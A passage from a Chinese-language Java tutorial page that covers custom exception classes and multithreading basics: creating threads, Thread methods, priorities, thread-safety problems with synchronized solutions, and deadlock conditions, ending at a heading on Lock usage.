<h4 id="自定义异常类"><a href="#自定义异常类" class="headerlink" title="自定义异常类"></a>自定义异常类</h4><p>Java中不同的异常类，分别表示着某一种具体的异常情况。那么在开发中总是有些异常情况是核心类库中没有定义好的，此时我们需要根据自己业务的异常情况来定义异常类。例如年龄负数问题，考试成绩负数问题，某员工已在团队中等。为了达到<strong>见名知义</strong>的目的，可以自定义异常类</p>
<p>自定义异常方法：</p>
<ol>
<li>继承一个异常类型<ul>
<li>自定义一个编译时异常类型：自定义类继承<code>java.lang.Exception</code>。</li>
<li>自定义一个运行时异常类型：自定义类继承<code>java.lang.RuntimeException</code>。</li>
</ul>
</li>
<li>建议大家提供至少两个构造器，一个是无参构造，一个是(String message)构造器。</li>
<li>自定义异常需要提供<code>serialVersionUID</code></li>
</ol>
<p>示例：仿造异常类的设计</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">23423423435L</span>;<span class="comment">//待后续io流解释，不写自动分配，但会变</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> idnumber;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyException</span><span class="params">(String message, <span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(message);</span><br><span class="line">        <span class="built_in">this</span>.idnumber = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> idnumber;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意点：</p>
<ol>
<li>自定义的异常只能通过throw抛出。</li>
<li>自定义异常最重要的是异常类的名字和message属性。当异常出现时，可以根据名字判断异常类型。比如：<code>TeamException(&quot;成员已满，无法添加&quot;); </code>、 <code>TeamException(&quot;该员工已是某团队成员&quot;);</code></li>
<li>自定义异常对象只能手动抛出。抛出后由try..catch处理，也可以甩锅throws给调用者处理。</li>
</ol>
<h3 id="第10章-多线程"><a href="#第10章-多线程" class="headerlink" title="第10章_多线程"></a>第10章_多线程</h3><p>程序：为完成特定任务，用某种语言编写的<code>一组指令的集合</code>。即指<code>一段静态的代码</code>，静态对象。<br>进程：程序的一次执行过程，或是正在内存中运行的应用程序。如：运行中的QQ，运行中的网易音乐播放器。</p>
<ul>
<li>每个进程都有一个独立的内存空间，系统运行一个程序即是一个进程从创建、运行到消亡的过程。（生命周期）</li>
<li>程序是静态的，进程是动态的</li>
<li>不同的进程之间是不共享内存的。进程之间的数据交换和通信的成本很高。</li>
<li>进程作为<code>操作系统调度和分配资源的最小单位</code>（亦是系统运行程序的基本单位），系统在运行时会为每个进程分配不同的内存区域。</li>
<li>现代的操作系统，大都是支持多进程的，支持同时运行多个程序。比如：现在我们上课一边使用编辑器，一边使用录屏软件，同时还开着画图板，dos窗口等软件。</li>
</ul>
<p>线程：进程可进一步细化为线程，是程序内部的<code>一条执行路径</code>。一个进程中至少有一个线程。</p>
<ul>
<li>一个进程同一时间若<code>并行</code>执行多个线程，就是支持多线程的。</li>
<li>线程作为<code>CPU调度和执行的最小单位</code>。</li>
<li>一个进程中的多个线程共享相同的内存单元，它们从同一个堆中分配对象，可以访问相同的变量和对象。这就使得线程间通信更简便、高效。但多个线程操作共享的系统资源可能就会带来<code>安全的隐患</code>。</li>
<li>下图中，红框的蓝色区域为线程独享，黄色区域为线程共享。</li>
</ul>
<p>多线程的优点：</p>
<ol>
<li>提高应用程序的响应。对图形化界面更有意义，可增强用户体验。</li>
<li>提高计算机系统CPU的利用率</li>
<li>改善程序结构。将既长又复杂的进程分为多个线程，独立运行，利于理解和修改</li>
</ol>
<p>并行：指两个或多个事件在<code>同一时刻</code>发生（同时发生）。指在同一时刻，有<code>多条指令</code>在<code>多个CPU</code>上<code>同时</code>执行。比如：多个人同时做不同的事。<br>并发：指两个或多个事件在<code>同一个时间段内</code>发生。即在一段时间内，有<code>多条指令</code>在<code>单个CPU</code>上<code>快速轮换、交替</code>执行，使得在宏观上具有多个进程同时执行的效果。</p>
<p>Thread类的特性</p>
<ul>
<li>每个线程都是通过某个特定Thread对象的run()方法来完成操作的，因此把run()方法体称为<code>线程执行体</code>。</li>
<li>通过该Thread对象的start()方法来启动这个线程，而非直接调用run()</li>
<li>要想实现多线程，必须在主线程中创建新的线程对象。</li>
</ul>
<h4 id="线程的创建方式1-继承Thread类"><a href="#线程的创建方式1-继承Thread类" class="headerlink" title="线程的创建方式1:继承Thread类"></a>线程的创建方式1:继承Thread类</h4><p>步骤：</p>
<ol>
<li>定义Thread类的子类</li>
<li>重写Thread类的run()方法，该run()方法的方法体就代表了线程需要完成的任务</li>
<li>创建Thread子类的实例，即创建了线程对象</li>
<li>调用线程对象的start()方法来启动该线程</li>
</ol>
<p>注意：</p>
<ol>
<li>此方法会导致线程类不能再继承其他类（类的单继承性）</li>
<li>必须使用对象.start()才是调用线程，对象.run()方法启动的不是多线程</li>
<li>已经执行start()方法的调用不能在使用对象.start()启动新进程，必须声明新的对象</li>
</ol>
<p>示例：两个线程，分别遍历100以内奇偶数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">EvenNumberPrint</span> <span class="variable">evenNumberPrint</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvenNumberPrint</span>();</span><br><span class="line">        <span class="type">OddNumberPrint</span> <span class="variable">oddNumberPrint</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OddNumberPrint</span>();</span><br><span class="line">        evenNumberPrint.start();</span><br><span class="line">        oddNumberPrint.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EvenNumberPrint</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;:&quot;</span> + i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OddNumberPrint</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;:&quot;</span> + i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>匿名子类的写法(简单但不符合阿里语法规范)：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="keyword">new</span> <span class="title class_">Thread</span>()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;:&quot;</span> + i);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">       &#125;.start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName() + <span class="string">&quot;:&quot;</span> + i);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="线程的创建方式2-实现Runnable接口"><a href="#线程的创建方式2-实现Runnable接口" class="headerlink" title="线程的创建方式2:实现Runnable接口"></a>线程的创建方式2:实现Runnable接口</h4><p>步骤如下：</p>
<ol>
<li>定义Runnable接口的实现类</li>
<li>重写Runnable接口的run()方法，该run()方法的方法体同样是该线程的线程执行体。</li>
<li>创建Runnable实现类的实例</li>
<li>将此实例作为Thread类构造器中的target参数来创建Thread对象，该Thread对象才是真正<br>的线程对象。</li>
<li>调用线程对象的start()方法，启动线程。调用Runnable接口实现类的run方法。</li>
</ol>
<p>示例：两个线程，分别遍历100以内奇偶数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">EvenNumberPrint</span> <span class="variable">evenNumberPrint</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvenNumberPrint</span>();</span><br><span class="line">        <span class="type">OddNumberPrint</span> <span class="variable">oddNumberPrint</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OddNumberPrint</span>();</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(evenNumberPrint);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(oddNumberPrint);</span><br><span class="line">        thread1.start();</span><br><span class="line">        thread.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EvenNumberPrint</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;:&quot;</span> + i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OddNumberPrint</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;:&quot;</span> + i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>匿名类的方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;:&quot;</span> + i);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">                        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;:&quot;</span> + i);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两种创建线程的方式对比：<br>共同点：</p>
<ul>
<li>Thread类实际上也是实现了Runnable接口的类。即：    <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Thread</span> <span class="keyword">extends</span> <span class="title class_">Object</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span></span><br></pre></td></tr></table></figure></li>
<li>启动线程，使用的都是Thread类中定义的start()，创建的线程对象都是Thread类或其子类的实例。</li>
</ul>
<p>不同点：</p>
<ul>
<li>继承Thread：线程代码存放Thread子类run方法中。</li>
<li>实现Runnable：线程代码存在接口的子类的run方法。</li>
</ul>
<p><strong>实现Runnable接口比继承Thread类所具有的优势</strong></p>
<ul>
<li>避免了单继承的局限性</li>
<li>多个线程可以<strong>共享同一个接口实现类的对象</strong>，非常适合多个相同线程来处理同一份资源。</li>
<li>增加程序的健壮性，实现解耦操作，代码可以被多个线程共享，代码和线程独立。</li>
</ul>
<h4 id="Thread中常用的方法"><a href="#Thread中常用的方法" class="headerlink" title="Thread中常用的方法"></a>Thread中常用的方法</h4><ol>
<li>构造器<ul>
<li>public Thread() :分配一个新的线程对象。</li>
<li>public Thread(String name) :分配一个指定名字的新的线程对象。</li>
<li>public Thread(Runnable target) :指定创建线程的目标对象，它实现了Runnable接口中的run方法</li>
<li>public Thread(Runnable target,String name) :分配一个带有指定目标新的线程对象并指定名字。</li>
</ul>
</li>
<li>常用方法<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> :此线程要执行的任务在此处定义代码。</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> :导致此线程开始执行; Java虚拟机调用此线程的run方法。</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> :获取当前线程名称。</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>：设置该线程名称。</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Thread <span class="title function_">currentThread</span><span class="params">()</span> :返回对当前正在执行的线程对象的引用。在Thread子类中就是<span class="built_in">this</span>，通常用于主线程和Runnable实现类</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">(<span class="type">long</span> millis)</span> :使当前正在执行的线程以指定的毫秒数暂停（暂时停止执行）。</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">yield</span><span class="params">()</span>：<span class="keyword">yield</span>只是让当前线程暂停一下，让系统的线程调度器重新调度一次，希望优先级与当前线程相同或更高的其他线程能够获得执行机会，但是这个不能保证，完全有可能的情况是，当某个线程调用了<span class="keyword">yield</span>方法暂停之后，线程调度器又将其调度出来重新执行。</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">isAlive</span><span class="params">()</span>：测试线程是否处于活动状态。如果线程已经启动且尚未终止，则为活动状态。 </span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">join</span><span class="params">()</span> ：等待该线程终止。 </span><br><span class="line"><span class="keyword">void</span> <span class="title function_">join</span><span class="params">(<span class="type">long</span> millis)</span> ：等待该线程终止的时间最长为 millis 毫秒。如果millis时间到，将不再等待。 </span><br><span class="line"><span class="keyword">void</span> <span class="title function_">join</span><span class="params">(<span class="type">long</span> millis, <span class="type">int</span> nanos)</span> ：等待该线程终止的时间最长为 millis 毫秒 + nanos 纳秒。</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">stop</span><span class="params">()</span>：`已过时`，不建议使用。强行结束一个线程的执行，直接进入死亡状态。run()即刻停止，可能会导致一些清理性的工作得不到完成，如文件，数据库等的关闭。同时，会立即释放该线程所持有的所有的锁，导致数据得不到同步的处理，出现数据不一致的问题。</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">suspend</span><span class="params">()</span> / <span class="keyword">void</span> <span class="title function_">resume</span><span class="params">()</span> : 这两个操作就好比播放器的暂停和恢复。二者必须成对出现，否则非常容易发生死锁。suspend()调用会导致线程暂停，但不会释放任何锁资源，导致其它线程都无法访问被它占用的锁，直到调用resume()。`已过时`，不建议使用。</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="线程优先级和相关方法"><a href="#线程优先级和相关方法" class="headerlink" title="线程优先级和相关方法"></a>线程优先级和相关方法</h4><p>每个线程都有一定的优先级，同优先级线程组成先进先出队列（先到先服务），使用分时调度策略。优先级高的线程采用抢占式策略，获得较多的执行机会。每个线程默认的优先级都与创建它的父线程具有相同的优先级。</p>
<p>Thread类的三个优先级常量：</p>
<ul>
<li>MAX_PRIORITY（10）：最高优先级 </li>
<li>MIN _PRIORITY （1）：最低优先级</li>
<li>NORM_PRIORITY （5）：普通优先级，默认情况下main线程具有普通优先级。</li>
</ul>
<p>常用方法：</p>
<ul>
<li>public final int getPriority() ：返回线程优先级 </li>
<li>public final void setPriority(int newPriority) ：改变线程的优先级，范围在[1,10]之间。</li>
</ul>
<h4 id="线程的生命周期："><a href="#线程的生命周期：" class="headerlink" title="线程的生命周期："></a>线程的生命周期：</h4><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240711161020.png" alt="JDK&lt;1.5进程生命周期示意图"></p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240711162142.png" alt="JDK&gt;=1.5进程生命周期示意图"><br>jdk1.5后把阻塞状态细分</p>
<h4 id="线程的安全问题和处理"><a href="#线程的安全问题和处理" class="headerlink" title="线程的安全问题和处理"></a>线程的安全问题和处理</h4><p>示例：售票</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WindowTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">SaleTicket</span> <span class="variable">saleTicket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SaleTicket</span>();</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(saleTicket,<span class="string">&quot;线程1&quot;</span>);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(saleTicket,<span class="string">&quot;线程2&quot;</span>);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(saleTicket,<span class="string">&quot;线程3&quot;</span>);</span><br><span class="line">        thread.start();thread1.start();thread2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SaleTicket</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(ticket &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;售票，票号为&quot;</span> + ticket);</span><br><span class="line">                ticket--;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*输出如下：三个窗口都卖出了100号的票(重票错票：多线程同时使用同一个资源或使用不存在的资源)</span></span><br><span class="line"><span class="comment">线程1售票，票号为100</span></span><br><span class="line"><span class="comment">线程2售票，票号为100</span></span><br><span class="line"><span class="comment">线程2售票，票号为98</span></span><br><span class="line"><span class="comment">线程3售票，票号为100</span></span><br><span class="line"><span class="comment">....</span></span><br><span class="line"><span class="comment">* */</span></span><br></pre></td></tr></table></figure>
<p>synchronized解决了线程的安全问题，但导致在操作共享数据时实际上串行处理的，降低了性能</p>
<p>解决方案：使用线程的同步机制<br>同步代码块方案</p>
<ul>
<li>格式：synchronized(同步监视器){需要被同步的代码（即多线程操作的共享数据）}</li>
<li>需要被同步的代码在被某个线程执行过程中其他线程不能执行。</li>
<li>同步监视器即锁，可以使用<strong>任何一个类</strong>的对象存档，但多线程必须使用同一个同步监视器</li>
<li>在实现Runnable接口的方式中，同步监视器可以考虑使用this</li>
<li>在继承Thread类的方式中，同步监视器应当慎用this(指定的对象可能不一样)，可以考虑使用<code>当前类.class</code></li>
</ul>
<p>示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SaleTicket</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();<span class="comment">//任何一个类都行，也可以自己声明一个类</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (obj)&#123;</span><br><span class="line">                <span class="comment">//常用 synchronized (this)，这里的this是saleTicket</span></span><br><span class="line">                <span class="comment">//使用继承Thread类的方法实现多线程时，就不能使用this，因为this指定的对象不一样</span></span><br><span class="line">                <span class="comment">//   ==》 需要static 修饰上文的Obj对象</span></span><br><span class="line">                <span class="comment">//   ==》 或使用当前类.class即Window.class</span></span><br><span class="line">                <span class="keyword">if</span>(ticket &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName() + <span class="string">&quot;售票，票号为&quot;</span> + ticket);</span><br><span class="line">                    ticket--;</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同步方法方案：若操作共享数据的代码完整地声明在一个方法中，我们就能将此方法直接声明为同步方法</p>
<ul>
<li>在这种方案中，非静态的同步方法，同步监视器默认是this</li>
<li>静态的同步方法，同步监视器默认是当前类本身</li>
</ul>
<p>示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SaleTicket</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isFlag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(isFlag)&#123;</span><br><span class="line">            show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span>  <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(ticket &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;售票，票号为&quot;</span> + ticket);</span><br><span class="line">                ticket--;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                isFlag = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="死锁和Lock-锁"><a href="#死锁和Lock-锁" class="headerlink" title="死锁和Lock(锁)"></a>死锁和Lock(锁)</h4><p>不同的线程分别占用对方需要的同步资源不放弃，都在等待对方放弃自己需要的同步资源，就会形成线程的死锁<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240711201627.png" alt="死锁的概念"></p>
<p>死锁的四个条件：</p>
<ol>
<li>互斥</li>
<li>占用且等待</li>
<li>不可剥夺</li>
<li>循环等待</li>
</ol>
<p>死锁的解决：破环上诉四条件，一般是破坏2，3，4</p>
<ol>
<li>针对条件2 可以考虑一次性申请所有所需的资源，这样就不存在等待的问题。</li>
<li>针对条件3：占用部分资源的线程在进一步申请其他资源时，如果申请不到，就主动释放掉已经占用的资源。</li>
<li>针对条件4：可以将资源改为线性顺序。申请资源时，先申请序号较小的，这样避免循环等待问题。</li>
</ol>
<p>lock的使用</p>
<p>示例：</p>
